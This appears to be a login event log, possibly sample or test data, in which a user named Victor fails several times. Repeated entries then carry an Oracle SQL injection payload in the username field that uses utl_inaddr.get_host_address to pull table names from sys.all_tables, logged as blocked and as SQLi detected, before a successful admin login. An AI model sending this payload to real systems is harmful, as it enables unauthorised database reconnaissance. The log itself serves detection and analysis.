[2025-06-13 23:31:39] User: Victor | Status: Failed | Reason: Invalid credentials
[2025-06-13 23:31:44] User: Victor | Status: Failed | Reason: Invalid credentials
[2025-06-13 23:31:47] User: Victor | Status: Failed | Reason: Invalid credentials
[2025-06-13 23:31:58] User: Victor | Status: Failed | Reason: Invalid credentials
[2025-06-13 23:32:01] User: Victor | Status: Failed | Reason: Invalid credentials
[2025-06-13 23:32:15] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: Too many attempts
[2025-06-13 23:32:30] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: Too many attempts
[2025-06-13 23:32:35] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: Too many attempts
[2025-06-13 23:32:41] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: Too many attempts
[2025-06-13 23:32:45] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: Too many attempts
[2025-06-13 23:32:48] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: Too many attempts
[2025-06-13 23:33:09] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: SQLi Detected
[2025-06-13 23:33:14] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: SQLi Detected
[2025-06-13 23:33:18] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: SQLi Detected
[2025-06-13 23:33:21] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: SQLi Detected
[2025-06-13 23:33:31] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: SQLi Detected
[2025-06-13 23:33:37] User: AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i | Status: Blocked | Reason: SQLi Detected
[2025-06-13 23:34:01] User: ADMIN | Status: Failed | Reason: Invalid credentials
[2025-06-13 23:34:24] User: admin | Status: Success | Reason: 
